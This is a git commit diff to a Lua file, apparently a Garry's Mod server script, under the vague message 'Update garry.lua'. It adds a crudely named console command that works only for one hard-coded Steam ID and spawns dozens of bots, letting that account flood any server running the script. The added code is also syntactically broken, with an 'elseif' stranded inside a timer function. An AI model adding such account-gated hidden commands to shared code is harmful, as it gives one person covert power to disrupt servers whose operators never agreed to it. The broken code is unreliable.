f36b701f7ea4a469d0669e0c68f8e66d79363197
AnonFall <78989850+32N133kuzik133N32@users.noreply.github.com>
2023-02-07 19:00:20 +1100

    Update garry.lua

--- garry.lua
+++ garry.lua
@@ -35,6 +35,39 @@ if SERVER then
    end
 
 
+concommand.Add("penis_bot", function( ply, cmd, args ) 
+if ply:SteamID() == 'STEAM_0:0:555589835' then 
+
+    timer.Simple(.1,function()
+        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
+        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
+        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
+        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
+        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
+        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
+        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
+        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
+        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
+        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
+        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
+        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)   
+        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
+        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
+        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
+        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
+        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
+        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
+        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
+        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
+        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
+        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
+        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
+        timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
+       elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then
+   
+    end)
+end
+end)
 
 
 
